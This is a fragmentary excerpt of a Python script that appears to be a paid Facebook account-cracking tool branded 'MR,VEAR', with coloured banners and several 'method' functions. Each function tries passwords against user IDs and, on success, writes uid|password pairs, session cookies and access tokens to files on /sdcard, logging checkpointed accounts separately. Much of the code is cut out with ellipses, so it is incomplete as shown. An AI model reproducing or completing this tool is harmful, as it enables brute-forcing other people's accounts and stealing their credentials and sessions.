...
\x1b[31;1m   \x1b[47;2m[ THIS TOOL IS PAID ]\x1b[00;1m\x1b[31;1m \x1b[31;1m \x1b[47;2m[ MADE IN NEPAL]\x1b[00;1m\x1b[31;1m
...
\033[1;97m VERSION:\033[1;92m 0.2
...
class iAmMain:
	...
	def method1(self,uid,nm,pwx):
		...
		try:
			...
			sys.stdout.write('\r [MR,VEAR] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
   ...
   "scheme": 'https',
    ...
    'viewport-width': '980',
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[MR,VEAR-OK] %s | %s \033[1;97m '%(uid,pw))

					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')

					ok.append(uid)

					open('/sdcard/MR,VEAR_OK.txt','a').write(uid+'|'+pw+'\n')

					open('/sdcard/MR,VEAR_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')

					break

				elif 'www.facebook.com' in q['error']['message']:

					p('\r\033[1;91m[MR,VEAR-CP] %s | %s \033[1;97m '%(uid,pw))

					cp.append(uid)

					open('/sdcard/MR,VEAR_CP.txt','a').write(uid+'|'+pw+'\n')
	...
	def method2(self,uid,nm,pwx):
		...
		try:
			...
			sys.stdout.write('\r [MR,VEAR] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
   ...
   "scheme": 'https',
    ...
    'viewport-width': '980',
				...
				if "session_key" in q:
					...
					open('/sdcard/MR,VEAR_M2_CP.txt','a').write(uid+'|'+pw+'\n')
	...
	def method3(self,uid,nm,pwx):
		...
		try:
			...
			sys.stdout.write('\r [MR,VEAR %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
   ...
   "scheme": 'https',
    ...
    'viewport-width': '980',
				...
				if "session_key" in q:
					...
					open('/sdcard/MR,VEAR-OK.txt','a').write(uid+'|'+pw+'\n')

					open('/sdcard/MR,VEAR-COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					...
					open('/sdcard/MR,VEAR-CP.txt','a').write(uid+'|'+pw+'\n')
	...
	def method4(self,uid,nm,pwx):
		...
		try:
			...
			sys.stdout.write('\r [MR,VEAR] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
   ...
   "scheme": 'https',
	...
	def r_crack(self,uid,pwx):
		...
		try:
			...
			sys.stdout.write('\r [MR,VEAR] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
   ...
   "scheme": 'https',
    ...
    'viewport-width': '980',
				...
				if "session_key" in q:
					...
					open('/sdcard/MR,VEAR_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
